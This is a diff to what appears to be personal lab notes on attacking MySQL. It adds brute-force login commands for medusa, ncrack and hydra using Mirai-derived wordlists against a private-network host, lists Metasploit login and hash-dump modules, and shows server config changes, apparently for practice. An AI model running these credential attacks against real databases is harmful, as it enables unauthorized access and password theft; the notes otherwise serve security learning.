@@ -13,13 +13,27 @@ msf5 > use auxiliary/scanner/mysql/mysql_login
 
 3.MYSQL Password Hashdump
 msf5 > use auxiliary/scanner/mysql/mysql_hashdump
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[pratique]:medusa
+#medusa -h 192.168.1.56 -u testroot -p testpassword -M mysql
+#medusa -h 192.168.1.56 -u testroot -P ./mirai_pass.txt -M mysql -f
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-[practique]:mysql
+[pratique]:ncrack
+#ncrack -v -U ./mirai_user.txt -P ./mirai_pass.txt 192.168.1.56 -p 3306
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[pratique]:hydra
+#hydra -L ./mirai_user.txt -P ./mirai_pass.txt 192.168.1.56 mysql
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[pratique][configuration]:mysql
 #vim /etc/mysql/mariadb.conf.d/50-server.cnf
 ```
 bind-address		= 127.0.0.1
 bind-address		= 0.0.0.0
+general_log_file        = /var/log/mysql/mysql.log
+general_log             = 1
 ```
 # netstat -anptu
 
